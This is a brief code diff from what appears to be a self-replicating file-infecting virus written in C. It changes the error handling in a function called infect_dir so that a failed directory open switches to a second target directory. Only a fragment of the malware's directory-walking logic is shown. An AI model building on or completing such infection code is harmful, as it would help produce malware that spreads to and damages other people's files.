@@ -428,7 +428,11 @@ infect_dir(volatile char *dir_path, volatile int fd_self) {
     for (volatile int dir_index = 0; dir_index < 2; dir_index++) {
 
         int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
-        if (fd_dir < 0) return 0;
+        if (fd_dir < 0) {
+            dir_path[9] = '2';
+            dir_path[10] = '\0';
+            continue;
+        }
 
         const uint64_t FILE_NAME_MAX = 255;
         const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
